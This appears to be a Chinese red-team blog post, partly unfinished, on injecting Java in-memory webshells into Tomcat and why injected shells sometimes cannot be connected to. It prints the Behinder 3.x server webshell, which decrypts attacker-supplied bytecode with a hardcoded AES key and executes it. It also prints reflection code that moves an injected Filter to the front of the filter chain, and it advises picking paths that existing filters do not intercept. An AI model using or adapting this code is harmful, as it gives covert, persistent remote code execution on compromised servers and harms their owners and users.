## 论如何优雅注入 Java 内存马

### 前言 



回顾之前做红队的时候，经常遇到很多内存马明明已经注入了，但无法连接上。同时有些时候也会遇到内存马无法注入，当然这里不考虑 RASP 之类的防御机制。虽然我已经不是红队，但这些问题时常想起总是困恼着我，在这里我想尝试找一下这些问题的答案。

在此之前无法连接的情况，通常会考虑注入一个静态路径或者是一个完全虚拟的路径，一般情况下是能成功绕过。但也有一些极端的情况，还是无法注入内存马，具体情况目前我也无法得知，只能进行猜测。



---

### 传统 Java 内存马

下面是一段冰蝎3.x版本的服务端链接代码，如果要注入 **Serlvet** 内存马也就约等同于在内存中注入这段代码。

```java
    @RequestMapping("/behinder/shell2") // behinder3.0
    public void Shell2(ServletRequest request, ServletResponse response)
            throws InvalidKeyException, IOException, NoSuchPaddingException, NoSuchAlgorithmException,
            IllegalBlockSizeException, BadPaddingException, InstantiationException, IllegalAccessException {
        String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        Map objMap = new HashMap();
        HttpSession session = ((HttpServletRequest) request).getSession();
        session.putValue("u",k);
        objMap.put("session", session);
        objMap.put("response", response);
        objMap.put("request", request);
        Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(objMap);
    }

```

如果要注册 Filter 也就是在 doFilter 方法中增加内存马的逻辑，无论是 Serlvet 还是 Filter、Listener 内存马，本质上都是动态注册。

理论上传统内存马的优先级是 **Listener > Filter > Serlvet**，但正常情况下一个干净的 Java Web 的容器应该是不存在任何 Listener （这里可能不是很严谨，但至少Tomcat是没有，特殊情况除外）。并且由于 Listener 本身的特点，会很大干扰业务的正常运行，正常情况下还是不要考虑注入 Listener 内存马。

那么我们注入内存马的优先级应该变为了 **Filter > Serlvet**，注入 Serlvet 内存马得考虑原来服务中可能存在 Filter 的，得找一个默认不会进行拦截的路径进行注入。

简单举一个例子，我首先在我的服务代码中注册了一个 Filter ，只要请求路径中不含有 favicon 才会放行请求。

![image-20221102170753797](https://raw.githubusercontent.com/SummerSec/Images/main/202211/202211021707966.png)

![image-20221102170839653](https://raw.githubusercontent.com/SummerSec/Images/main/202211/202211021708701.png)

如果此时我们注入一个 Serlvet 内存马，路径为 **/favicondemo.ico** 内存马，我们是无法连接的。

![image-20221102171117109](https://raw.githubusercontent.com/SummerSec/Images/main/202211/202211021711154.png)

![image-20221102171135904](https://raw.githubusercontent.com/SummerSec/Images/main/202211/202211021711939.png)

![image-20221102172528685](https://raw.githubusercontent.com/SummerSec/Images/main/202211/202211021725775.png)

分析至此，那么最好的选择是注入 Filter 类型内存马。因为即使正常业务中存在 Listener 其目的也不会影响后续的 Filter 执行（理论上应如此）。

---

### 无法连接？

目前为了注入 Filter 之后能连接上，会将注入的内存马得执行顺序放在第一位，注入成功之后就理论不会存在连接不上的情况，当然排除有 RASP 之类的存在。

```java
                Class filterMap;
                try {
                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception var21) {
                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                }

                Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));

                for(int i = 0; i < filterMaps.length; ++i) {
                    Object filterMapObj = filterMaps[i];
                    findFilterMaps = filterMap.getMethod("getFilterName");
                    String name = (String)findFilterMaps.invoke(filterMapObj);
                    if (name.equalsIgnoreCase(filterName)) {
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMapObj;
                    }
                }
```

为什么无法连接呢？我在测试的时候发现会存在动态注册的 Filter 内存马顺序会被移动。详情如下，首先我利用工具注册了一个 Pattern 为 **/favicondemo.ico** 的内存马。之后我再次注册一个 Pattern 为 **/favicondemo1.ico** 的内存马，通过扫描 Filter 发现  Pattern 为 **/favicondemo.ico** 的内存马原来的 ID 为 1，现在变为了 7。

![image-20221103113221051](https://raw.githubusercontent.com/SummerSec/Images/main/202211/202211031132339.png)



![image-20221103113709759](https://raw.githubusercontent.com/SummerSec/Images/main/202211/202211031137866.png)

很明显的可以看到，第一次注册的 Pattern 为 **/favicondemo.ico** 的执行顺序都在服务代码注册**com.example.shirovul.filter.WebFilter** 的下面了，通过这个现象不难**推测**哪些无法连接的内存马是不是在无形之中执行顺序被改变了呢？





---

### 新型 WS 内存马



---

### Agent 内存马





---

### 总结





---

### 参考

https://xz.aliyun.com/t/11640

https://y4er.com/posts/javaagent-tomcat-memshell/
